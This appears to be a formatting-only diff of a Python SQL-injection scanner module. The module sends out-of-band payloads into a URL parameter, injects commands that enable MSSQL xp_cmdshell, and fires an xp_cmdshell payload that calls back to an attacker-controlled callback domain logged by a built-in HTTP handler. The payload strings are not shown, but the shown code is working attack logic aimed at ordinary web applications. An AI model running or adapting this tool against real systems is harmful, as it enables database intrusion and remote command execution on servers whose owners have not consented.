@@ -33,11 +33,13 @@ class OOBHandler(BaseHTTPRequestHandler):
 
     def do_GET(self):
         with OOBHandler.lock:
-            OOBHandler.callbacks.append({
-                "path": self.path,
-                "client": self.client_address,
-                "time": time.time(),
-            })
+            OOBHandler.callbacks.append(
+                {
+                    "path": self.path,
+                    "client": self.client_address,
+                    "time": time.time(),
+                }
+            )
         self.send_response(200)
         self.end_headers()
         self.wfile.write(b"OK")
@@ -85,8 +87,7 @@ class SQLiOOB:
             payload = tpl % oob_domain
             try:
                 sep = "&" if "?" in url else "?"
-                self.sess.get("%s%s%s=%s" % (url, sep, param, payload),
-                              timeout=self.timeout)
+                self.sess.get("%s%s%s=%s" % (url, sep, param, payload), timeout=self.timeout)
                 result["findings"].append({"type": payload_type, "payload": payload[:50]})
                 result["vulnerable"] = True
             except Exception as e:
@@ -101,16 +102,14 @@ class SQLiOOB:
         for cmd in enable_cmds:
             try:
                 sep = "&" if "?" in url else "?"
-                self.sess.get("%s%s%s=%s" % (url, sep, param, cmd),
-                              timeout=self.timeout)
+                self.sess.get("%s%s%s=%s" % (url, sep, param, cmd), timeout=self.timeout)
                 result["findings"].append({"cmd": cmd[:40]})
             except Exception as e:
                 logger.debug("xp enable: %s", e)
         test_payload = OOB_PAYLOADS["mssql_xp_cmdshell"] % oob_domain
         try:
             sep = "&" if "?" in url else "?"
-            self.sess.get("%s%s%s=%s" % (url, sep, param, test_payload),
-                          timeout=self.timeout)
+            self.sess.get("%s%s%s=%s" % (url, sep, param, test_payload), timeout=self.timeout)
             result["vulnerable"] = True
             result["findings"].append({"xp_cmdshell": test_payload[:40]})
         except Exception as e:
@@ -131,7 +130,12 @@ class SQLiOOB:
         return []
 
 
-def check(url: str, param: str, oob_domain: str = "oob.local",
-          sess: Optional[requests.Session] = None, timeout: float = 10.0) -> Dict:
+def check(
+    url: str,
+    param: str,
+    oob_domain: str = "oob.local",
+    sess: Optional[requests.Session] = None,
+    timeout: float = 10.0,
+) -> Dict:
     oob = SQLiOOB(sess, timeout)
     return oob.test_all(url, param, oob_domain)
